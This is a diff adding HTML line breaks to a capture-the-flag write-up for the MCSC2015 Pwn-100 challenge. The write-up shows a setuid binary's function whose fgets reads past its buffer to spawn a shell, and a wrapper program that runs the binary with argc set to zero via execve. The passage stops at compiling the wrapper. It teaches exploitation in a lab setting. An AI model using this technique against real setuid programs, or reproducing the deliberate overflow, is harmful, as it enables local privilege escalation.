@@ -1,63 +1,63 @@
-\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
-MCSC2015 writeup for Pwn-100
-\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
+MCSC2015 writeup for Pwn-100<br>
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
 
-pwn0@MCSC2015:/challenges/pwn0$ ls -l
-total 16
--rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0
--r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG
--rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c
-
-after a quick view in pwn0.c, here's an interesting function
-
-void vuln() 
-{
-	unsigned int reg;
-	char buffer[BUFF_SIZE];
-	fgets(buffer , BUFF_SIZE+5 , stdin);
-	if(reg == 78954)
-	{
-		printf("You Win\n");
-		system("/bin/dash");
-	}
-}
-
-However, this function is executed if and only if argc is equal to zero.
-In that case, execve can be handy ...
-
-
-Step 1 : run the program with argc equals to zero to allow the function vuln() to be executed.
-Step 2 : overwrite the variable reg with 78954
-if(reg == 78954)
-{
-	printf("You Win\n");
-	system("/bin/dash");
-}
-\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
-Step1 : run a program with argc=0
-What's special about the family exec call system ?
-execve allows you to specify the command-line arguments (including the program name).
-a normal call to execve for example would be :
-execve("/home/xxx/prog","prog",NULL) witch is similar to /home/xxx/prog with argc equals to 1 as usual ....
-execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is equal to zero in that case.
-
-with that said, let's start exploiting .....
-First, we write a small program 
-\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
-\#include \<stdio.h>
-\#include \<stdlib.h>
-int main()
-{
-	execve("/challenges/pwn0/0",NULL,NULL);
-}
-\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
-pwn0@MCSC2015:/tmp$ mkdir /tmp/testing
-pwn0@MCSC2015:/tmp$ cd /tmp/testing/
-pwn0@MCSC2015:/tmp/testing$ cat wrapper.c
-\#include \<stdio.h>
-\#include \<stdlib.h>
-int main()
-{
+pwn0@MCSC2015:/challenges/pwn0$ ls -l<br>
+total 16<br>
+-rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0<br>
+-r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG<br>
+-rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c<br>
+<br>
+after a quick view in pwn0.c, here's an interesting function<br>
+<br>
+void vuln()<br>
+{<br>
+	unsigned int reg;<br>
+	char buffer[BUFF_SIZE];<br>
+	fgets(buffer , BUFF_SIZE+5 , stdin);<br>
+	if(reg == 78954)<br>
+	{<br>
+		printf("You Win\n");<br>
+		system("/bin/dash");<br>
+	}<br>
+}<br>
+<br>
+However, this function is executed if and only if argc is equal to zero.<br>
+In that case, execve can be handy ...<br>
+<br>
+<br>
+Step 1 : run the program with argc equals to zero to allow the function vuln() to be executed.<br>
+Step 2 : overwrite the variable reg with 78954<br>
+if(reg == 78954)<br>
+{<br>
+	printf("You Win\n");<br>
+	system("/bin/dash");<br>
+}<br>
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
+Step1 : run a program with argc=0<br>
+What's special about the family exec call system ?<br>
+execve allows you to specify the command-line arguments (including the program name).<br>
+a normal call to execve for example would be :<br>
+execve("/home/xxx/prog","prog",NULL) witch is similar to /home/xxx/prog with argc equals to 1 as usual ....<br>
+execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is equal to zero in that case.<br>
+<br>
+with that said, let's start exploiting .....<br>
+First, we write a small program <br>
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
+\#include \<stdio.h><br>
+\#include \<stdlib.h><br>
+int main()<br>
+{<br>
+	execve("/challenges/pwn0/0",NULL,NULL);<br>
+}<br>
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
+pwn0@MCSC2015:/tmp$ mkdir /tmp/testing<br>
+pwn0@MCSC2015:/tmp$ cd /tmp/testing/<br>
+pwn0@MCSC2015:/tmp/testing$ cat wrapper.c<br>
+\#include \<stdio.h><br>
+\#include \<stdlib.h><br>
+int main()<br>
+{<br>
 	execve("/challenges/pwn0/0",NULL,NULL);
 }
 pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper
